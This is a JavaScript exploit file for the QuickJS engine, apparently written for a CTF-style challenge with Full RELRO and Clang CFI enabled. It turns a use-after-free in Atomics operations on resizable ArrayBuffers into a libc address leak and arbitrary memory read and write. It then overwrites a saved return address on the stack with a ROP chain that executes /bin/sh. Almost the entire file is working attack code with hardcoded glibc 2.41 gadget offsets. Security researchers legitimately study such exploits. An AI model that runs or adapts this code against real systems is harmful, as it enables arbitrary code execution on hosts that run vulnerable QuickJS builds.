/*
 * QuickJS exploit (Full RELRO + Clang CFI) -> exec-shell-cfi
 *
 * Bug: Atomics captures a TypedArray element pointer, then executes user code
 * (valueOf) allowing Resizable ArrayBuffer.resize() to move/free backing store.
 * The atomic op then uses the stale pointer (UAF/OOB).
 *
 * Exploit:
 *  1) libc base leak: stale ptr reads unsorted-bin fd pointer (main_arena)
 *  2) AAR/AAW: overlap freed backing store with JSArrayBuffer struct and corrupt
 *     JSArrayBuffer::data to point at arbitrary addresses.
 *  3) Use libc environ to get envp (top of stack).
 *  4) Overwrite eval_buf()'s saved return address on the stack (fixed offset
 *     from envp in this build) with a libc ROP chain that calls:
 *        execve("/bin/sh", ["/bin/sh"], NULL)
 */

const MAIN_ARENA_FD_OFF = 0x1e7b20n;
const ENVIRON_OFF       = 0x1eee28n;

// libc gadgets/symbols (glibc 2.41)
const G_RET         = 0x2846bn;
const G_POP_RDI     = 0x2a145n; // pop rdi ; ret (mid-insn)
const G_POP_RSI     = 0x2baa9n; // pop rsi ; ret (mid-insn)
const G_POP_RDX_RBX = 0x8f0c5n; // pop rdx ; pop rbx ; ret
const EXECVE_OFF    = 0xdddd0n;
const BINSH_OFF     = 0x1a7ea4n;

// Stack layout constant (from gdb on this build):
// saved RIP for eval_buf() is stored at (envp - 0x4e8)
const EVALBUF_SAVED_RIP_OFF_FROM_ENVP = 0x4e8n;

// QuickJS is refcounted: keep corrupted buffers alive until execve.
globalThis._keep = [];

function leak_libc_base() {
  let ab = new ArrayBuffer(0x1000, { maxByteLength: 0x10000 });
  let blk = new ArrayBuffer(0x1000);
  let ta = new BigUint64Array(ab);
  let mal = { valueOf() { ab.resize(0x8000); return 0n; } };
  let fd = Atomics.compareExchange(ta, 0, mal, 0n);
  return fd - MAIN_ARENA_FD_OFF;
}

function make_dv_at(target_addr, victim_len) {
  // byteLength=0x38 => malloc_usable_size==56 (glibc 2.41) -> stable overlap.
  let rab = new ArrayBuffer(0x38, { maxByteLength: 0x10000 });
  let blk = new ArrayBuffer(0x1000);
  let ta = new BigUint64Array(rab);

  let victim;
  let mal = {
    valueOf() {
      rab.resize(0x8000);
      victim = new ArrayBuffer(victim_len);
      return target_addr;
    }
  };

  Atomics.store(ta, 2, mal);
  let dv = new DataView(victim);
  _keep.push(dv);
  return dv;
}

function u64(dv, off) { return dv.getBigUint64(off, true); }
function w64(dv, off, v) { dv.setBigUint64(off, v, true); }

(function main() {
  let libc_base = leak_libc_base();

  // envp from libc environ
  let dv_env = make_dv_at(libc_base + ENVIRON_OFF, 0x100);
  let envp = u64(dv_env, 0);

  // Small stack window around envp (avoid kernel stack-growth heuristics)
  let stack_base = envp - 0x8000n;
  let dv_stack = make_dv_at(stack_base, 0x10000);

  // Address of eval_buf() saved RIP
  let saved_rip_addr = envp - EVALBUF_SAVED_RIP_OFF_FROM_ENVP;
  let ret_off = Number(saved_rip_addr - stack_base);

  // libc ROP chain at saved_rip_addr
  let ret = libc_base + G_RET;
  let pop_rdi = libc_base + G_POP_RDI;
  let pop_rsi = libc_base + G_POP_RSI;
  let pop_rdx_rbx = libc_base + G_POP_RDX_RBX;
  let execve = libc_base + EXECVE_OFF;
  let binsh = libc_base + BINSH_OFF;

  let argv_addr = saved_rip_addr + 9n * 8n;
  let chain = [
    ret,
    pop_rdi, binsh,
    pop_rsi, argv_addr,
    pop_rdx_rbx, 0n, 0n,
    execve,
    binsh, 0n,
  ];

  // Write tail first, then overwrite return address last.
  for (let i = chain.length - 1; i >= 1; i--) {
    w64(dv_stack, ret_off + i * 8, chain[i]);
  }
  w64(dv_stack, ret_off, chain[0]);
})();
